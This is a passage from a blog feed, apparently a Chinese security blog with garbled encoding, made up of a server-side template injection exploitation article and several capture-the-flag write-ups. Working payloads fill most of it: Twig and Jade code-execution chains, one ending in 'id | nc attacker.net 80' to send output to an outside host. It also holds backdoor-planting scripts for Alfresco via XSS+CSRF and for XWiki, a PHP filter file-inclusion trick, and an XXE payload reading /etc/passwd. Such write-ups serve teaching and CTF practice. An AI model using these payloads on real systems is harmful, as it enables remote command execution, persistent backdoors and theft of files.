punctuation">.</span></code></pre><pre><code>æˆ‘ä»¬å¯ä»¥ç”¨$template -&gt;$block($context,  $blocks)ç»•è¿‡ç™½åå•é™åˆ¶ã€‚ä»¥ä¸‹çš„ä»£ç ä¼šè°ƒç”¨ userObject å¯¹è±¡çš„  vulnerableMethodï¼š{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}ã€‚è™½ç„¶çŽ°åœ¨ä¸èƒ½èŽ·å¾—åŒ–å¢ƒå˜é‡ï¼Œä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ _context å±žæ€§æŸ¥æ‰¾å¼€å‘è€…è‡ªå®šä¹‰çš„å¯¹è±¡å¹¶è°ƒç”¨æœ‰ç”¨çš„ç›®æ ‡ã€‚</code></pre><h2 id="Jade"><a href="#Jade" class="headerlink" title="Jade"></a><strong>Jade</strong></h2><p>Jade æ˜¯ä¸€æ¬¾ Node.js æ¨¡æ¿å¼•æ“Žã€‚<a href="https://link.zhihu.com/?target=http://CodePen.io">http://CodePen.io</a> åˆ™å¯ä»¥æŽ¥å—ç”¨æˆ·é€’äº¤è¯¥æ¨¡æ¿ã€‚è¿™é‡Œï¼Œæˆ‘ä¼šå±•ç¤ºå¦‚ä½•å¯¹æ¨¡æ¿æ³¨å…¥è¿›è¡Œé»‘ç›’æµ‹è¯•ã€‚</p><p>é¦–å…ˆï¼Œè®©æˆ‘ä»¬æ¥ç¡®è®¤æ¨¡æ¿å¯ä»¥æ‰§è¡Œä»£ç ï¼š</p><pre class=" language-jade"><code class="language-jade"><span class="token punctuation">=</span><span class="token code"> <span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span></span><span class="token comment" spellcheck="true">//ç»“æžœï¼š49</span></code></pre><p>å†æ¥ç¡®è®¤ self å¯¹è±¡çš„ä½ç½®ï¼šja</p><pre class=" language-jade"><code class="language-jade"><span class="token punctuation">=</span><span class="token code"> root</span><span class="token comment" spellcheck="true">//ç»“æžœï¼š[object global]</span></code></pre><p>æˆ‘ä»¬æ¥åˆ—ä¸€ä¸‹å¯¹è±¡å±žæ€§å’Œå‡½æ•°ï¼š</p><pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root</span><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> x<span class="token punctuation">)</span></span>, #{prop}, ArrayBuffer, Int8Array, Uint8Array, Uint8ClampedArray<span class="token punctuation">...</span> global, process, GLOBAL, root</code></pre><p>è¿™äº›å¯èƒ½æ˜¯å¯åˆ©ç”¨çš„å‡½æ•°ï¼š</p><pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process</span><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> x<span class="token punctuation">)</span></span>, #{prop}, title, version, moduleLoadList<span class="token punctuation">...</span> mainModule, setMaxListeners, emit, once</code></pre><p>ç»•è¿‡ä¿æŠ¤æœºåˆ¶ï¼š</p><pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule</span><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> x<span class="token punctuation">)</span></span>, #{prop}å› ä¸ºå®‰å…¨åŽŸå› ï¼ŒCodePené˜»æ­¢äº†ä½ çš„è¯­å¥è¯·åˆ é™¤ä¸‹åˆ—å…³é”®å­—åŽè¿›è¡Œå°è¯•<span class="token punctuation">-</span><span class="token code"><span class="token operator">></span>process</span><span class="token punctuation">-</span><span class="token code"><span class="token operator">></span>mainModule</span><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process</span><span class="token punctuation">-</span><span class="token code"> x <span class="token operator">=</span> x<span class="token punctuation">.</span>mainModule</span><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> x<span class="token punctuation">)</span></span>, #{prop}, id, exports, parent, filename, loaded, children, paths, load, require, _compile</code></pre><p>ç¡®å®šæœ‰ç”¨çš„å‡½æ•°ï¼š</p><pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process</span><span class="token punctuation">-</span><span class="token code"> x <span class="token operator">=</span> x<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>require</span><span class="token punctuation">-</span><span class="token code"> <span class="token function">x</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span></span><span class="token tag">Cannot</span> <span class="token plain-text">find module 'a'</span></code></pre><p>æœ€ç»ˆ expï¼š</p><pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process</span><span class="token punctuation">-</span><span class="token code"> x <span class="token operator">=</span> x<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>require</span><span class="token punctuation">-</span><span class="token code"> x <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span></span><span class="token punctuation">=</span><span class="token code"> x<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'id | nc attacker.net 80'</span><span class="token punctuation">)</span></span></code></pre><p><img src="https://pic3.zhimg.com/80/v2-1ef32d510c3f13a531e57e5efcc43e66_720w.jpg" alt="img"></p><h2 id="å®žæˆ˜"><a href="#å®žæˆ˜" class="headerlink" title="å®žæˆ˜"></a><strong>å®žæˆ˜</strong></h2><h2 id="Alfresco"><a href="#Alfresco" class="headerlink" title="Alfresco"></a><strong>Alfresco</strong></h2><p>Alfresco æ˜¯ä¸€ä¸ªç”¨æˆ·åœ¨çº¿åˆä½œç±»çš„ CMSã€‚åœ°æƒé™ç”¨æˆ·èƒ½é€šè¿‡è¯„è®ºåŒºçš„ XSS æ¥å¾—åˆ°è¿è¡Œè¯¥ CMS çš„æœåŠ¡å™¨ Shellã€‚å…ˆå‰ Freemaker çš„  Payload åœ¨æ­¤å¤„å¯ä»¥ä¸åŠ ä¿®æ”¹åœ°åˆ©ç”¨ã€‚ä¸è¿‡æˆ‘åœ¨æ­¤å¤„å°†ä¹‹å‰çš„ payload æ¢æˆç”¨äº†ä¸€ä¸ªç»å…¸åŽé—¨ï¼š</p><pre class=" language-text"><code class="language-text"><#assign ex="freemarker.template.utility.Execute"?new()> ${ ex(url.getArgs())}</code></pre><p>åº•æƒé™ç”¨æˆ·ä¸èƒ½ç¼–è¾‘æ¨¡æ¿ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥ç”¨ XSS+CSRF æ¥è®©ç®¡ç†å‘˜å¸®æˆ‘ä»¬ä¿®æ”¹ï¼š</p><pre class=" language-text"><code class="language-text">tok = /Alfresco-CSRFToken=([^;]*)/.exec(document.cookie)[1];tok = decodeURIComponent(tok)do_csrf = new XMLHttpRequest();do_csrf.open("POST","http://"+document.domain+":8080/share/proxy/alfresco/api/node/workspace/SpacesStore/59d3cbdc-70cb-419e-a325-759a4c307304/formprocessor",false);do_csrf.setRequestHeader('Content-Type','application/json; charset=UTF-8');do_csrf.setRequestHeader('Alfresco-CSRFToken',tok);do_csrf.send('{"prop_cm_name":"folder.get.html.ftl","prop_cm_content":"&lgt;#assignex=\\"freemarker.template.utility.Execute\\"?new()> ${ex(url.getArgs())}","prop_cm_description":""}');</code></pre><h2 id="XWiki-Enterprise"><a href="#XWiki-Enterprise" class="headerlink" title="XWiki Enterprise"></a><strong>XWiki Enterprise</strong></h2><p>XWiki ä¸ä»…æ”¯æŒ Velocityï¼ˆæœ‰æ²™ç®±ï¼‰ï¼Œè¿˜å¯ä»¥è¿è¡Œ Groovy å’Œ Pythonï¼ˆæ²’æœ‰æ²™ç®±ï¼‰ã€‚ä½†æ˜¯åªæœ‰ç‰¹æƒç”¨æˆ·æ‰èƒ½ç¼–è¾‘åŽä¸¤è€…ï¼Œæˆ‘ä»¬æœ‰ä»€ä¹ˆæ–¹æ³•æ’å…¥æ²¡æœ‰æ²™ç®±ä¿æŠ¤çš„æ¨¡æ¿å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æ¥çœ‹çœ‹å®ƒçš„ $doc ç±»ï¼Œæœ‰ç»éªŒçš„è¯»è€…ä¸éš¾æŽ¨æµ‹å‡ºå®ƒçš„é—®é¢˜ï¼š</p><p><img src="https://pic2.zhimg.com/80/v2-b3781ab567854ee7884b1d2425df0f0d_720w.jpg" alt="img"></p><p>save å’Œ saveAsAuthor æ„å‘³ç€ï¼šsave ä¿å­˜çš„ä½œè€…æ˜¯æŒ‰æœ€åŽä¸€ä¸ªè§‚çœ‹é¡µé¢çš„äººå†³å®šçš„ï¼ˆè€Œä¸ä¸€å®šæ˜¯ä½œè€…ï¼‰ã€‚æˆ‘ä»¬å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªå¯ä»¥è‡ªä¿®æ”¹çš„é¡µé¢ï¼Œå½“ç‰¹æƒç”¨æˆ·æµè§ˆæ—¶ï¼Œå®ƒå°±ä¿®æ”¹å¹¶ä¿å­˜è‡ªå·±ï¼š</p><pre class=" language-velocity"><code class="language-velocity">innocent content{{velocity}}#if( $doc.hasAccessLevel("programming") )  $doc.setContent("    innocent content    {{python}}from subprocess import check_output    q = request.get('q') or 'true'    q = q.split(' ')    print ''+check_output(q)+''    {{/python}}  ")  $doc.save()#end{{/velocity}}</code></pre><p>å½“è¿™ä¸ªé¡µé¢è¢«ç‰¹æƒç”¨æˆ·æµè§ˆæ—¶ï¼ŒåŽé—¨å°±ä¼šè¢«è§¦å‘ã€‚ä¹‹åŽä»»æ„ç”¨æˆ·éƒ½å¯ä»¥ç”¨è¯¥é¡µé¢æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><p><img src="https://pic3.zhimg.com/80/v2-944d76a8db9b58f8ce98b8d521e66f6e_720w.jpg" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF:2020-CookieIsSoStable</title>
      <link href="2021/07/04/bjdctf-2020-cookieissostable/"/>
      <url>2021/07/04/bjdctf-2020-cookieissostable/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/07/04/bjdctf-2020-cookieissostable/image-20210709222509040.png" alt="image-20210709222509040"></p><pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}{{{_self.env.getFilter("id")}}</code></pre><p><img src="/2021/07/04/bjdctf-2020-cookieissostable/image-20210709221716988.png" alt="image-20210709221716988"></p><pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><p><img src="/2021/07/04/bjdctf-2020-cookieissostable/image-20210709222027216.png" alt="image-20210709222027216"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ASIS:2019-UnicornShop</title>
      <link href="2021/07/03/asis-2019-unicornshop/"/>
      <url>2021/07/03/asis-2019-unicornshop/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709165333232.png" alt="image-20210709165333232"></p><p>åœ¨purchaseè¾“å…¥ 1 3</p><p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709165354072.png" alt="image-20210709165354072"></p><p>åœ¨purchaseè¾“å…¥ 1 10</p><p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709165411956.png" alt="image-20210709165411956"></p><p>å‘çŽ°åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦</p><p>Unicodeç¼–ç å®‰å…¨é—®é¢˜:<a href="https://gality.cn/?p=123">https://gality.cn/?p=123</a></p><p>åˆ©ç”¨UTF-8ç¼–ç å®‰å…¨è½¬æ¢é—®é¢˜æ‰¾ä¸€ä¸ªå¤§äºŽ1337çš„å­—ç¬¦</p><p><a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p><p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709170804114.png" alt="image-20210709170804114"></p><p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709170918673.png" alt="image-20210709170918673"></p><p>å®ƒçš„UTF-8ç¼–ç :</p><p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709171017362.png" alt="image-20210709171017362"></p><p>æ‰€ä»¥åœ¨purchaseè¾“å…¥4 %E1%8D%BC</p><p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709165306391.png" alt="image-20210709165306391"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Unicodeå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BSidesCF:2020-HaveABadDay</title>
      <link href="2021/07/02/bsidescf-2020-haveabadday/"/>
      <url>2021/07/02/bsidescf-2020-haveabadday/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708083329054.png" alt="image-20210708083329054"></p><pre><code>?category=php://filter/convert.base64-encode/resource=index.php</code></pre><p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708085144001.png" alt="image-20210708085144001"></p><pre><code>?category=php://filter/convert.base64-encode/resource=index</code></pre><p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708085240233.png" alt="image-20210708085240233"></p><p>å…³é”®æºç ï¼š</p><pre><code>   &lt;?php                $file = $_GET['category'];                if(isset($file))                {                    if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){                        include ($file . '.php');                    }                    else{                        echo "Sorry, we currently only support woofers and meowers.";                    }                }                ?&gt;</code></pre><p>å³éœ€è¦å­˜åœ¨woofersï¼Œmeomersæˆ–è€…indexï¼Œå°è¯•è¯»å–ï¼š</p><pre><code>?category=meowers/../flag</code></pre><p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708085819451.png" alt="image-20210708085819451"></p><pre><code>?category=php://filter/convert.base64-encode/index/resource=flag</code></pre><p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708090020025.png" alt="image-20210708090020025"></p><p>PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7NjhkMDc0Y2ItNWY2Zi00MGZmLTg2MTEtZmI1NGM5NWNjY2EwfQo/Pgo=            </p><p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708090007549.png" alt="image-20210708090007549"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF:2019-SSRFMe</title>
      <link href="2021/07/01/de1ctf-2019-ssrfme/"/>
      <url>2021/07/01/de1ctf-2019-ssrfme/</url>
      
        <content type="html"><![CDATA[<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/env python </span><span class="token comment" spellcheck="true">#encoding=utf-8 </span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask <span class="token keyword">from</span> flask <span class="token keyword">import</span> request <span class="token keyword">import</span> socket <span class="token keyword">import</span> hashlib <span class="token keyword">import</span> urllib <span class="token keyword">import</span> sys <span class="token keyword">import</span> os <span class="token keyword">import</span> json reload<span class="token punctuation">(</span>sys<span class="token punctuation">)</span> sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span> app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span> secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>     <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>     self<span class="token punctuation">.</span>action <span class="token operator">=</span> action     self<span class="token punctuation">.</span>param <span class="token operator">=</span> param     self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign     self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#SandBox For Remote_Addr </span>        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>     <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>         result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>         result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                 tmpfile <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>                 resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                     result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp                 <span class="token keyword">else</span><span class="token punctuation">:</span>                     <span class="token keyword">print</span> resp                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                 result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>             <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                 f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>                 result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>                 result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>             <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                 result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>             result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>             result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>         <span class="token keyword">return</span> result     <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">return</span> <span class="token boolean">True</span>         <span class="token keyword">else</span><span class="token punctuation">:</span>             <span class="token keyword">return</span> <span class="token boolean">False</span> <span class="token comment" spellcheck="true">#generate Sign For Action Scan. @app.route("/geneSign", methods=['GET', 'POST'])</span><span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     action <span class="token operator">=</span> <span class="token string">"scan"</span>     <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span> @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr     <span class="token keyword">if</span><span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>     task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>     <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> open<span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>     socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>     <span class="token keyword">except</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span> <span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>     check<span class="token operator">=</span>param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token operator">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token boolean">False</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>     app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>     app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><p><img src="/2021/07/01/de1ctf-2019-ssrfme/image-20210708101543887.png" alt="image-20210708101543887"></p><p>ddb9a99ee5bc0c633c83429eaa500fd7</p><p><img src="/2021/07/01/de1ctf-2019-ssrfme/image-20210708101628948.png" alt="image-20210708101628948"></p><p>c41a6ae35d06f1fcf3fd74ff476257a1</p><p><img src="/2021/07/01/de1ctf-2019-ssrfme/image-20210708102212134.png" alt="image-20210708102212134"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NCTF:2019-FakeXMLcookbook</title>
      <link href="2021/06/25/nctf-2019-fakexmlcookbook/"/>
      <url>2021/06/25/nctf-2019-fakexmlcookbook/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/06/25/nctf-2019-fakexmlcookbook/image-20210625163322248.png" alt="image-20210625163322248"></p><p>XXEæ”»å‡»</p><pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM "file:///etc/passwd"&gt;  ]&gt;  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre><p>æ³¨æ„adminå‰åŽæœ‰&amp;å’Œ;</p><p><img src="/2021/06/25/nctf-2019-fakexmlcookbook/image-20210625163505651.png" alt="image-20210625163505651"></p><pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM "file:///flag"&gt;  ]&gt;  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2021/06/25/nctf-2019-fakexmlcookbook/image-20210625163906282.png" alt="image-20210625163906282"></p>]]></content>
      
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼Žæ¯:2020-PhpWeb</title>
      <link href="2021/06/24/wang-ding-bei-2020-phpweb/"/>
      <url>2021/06/24/wang-ding-bei-2020-phpweb/</url>
      
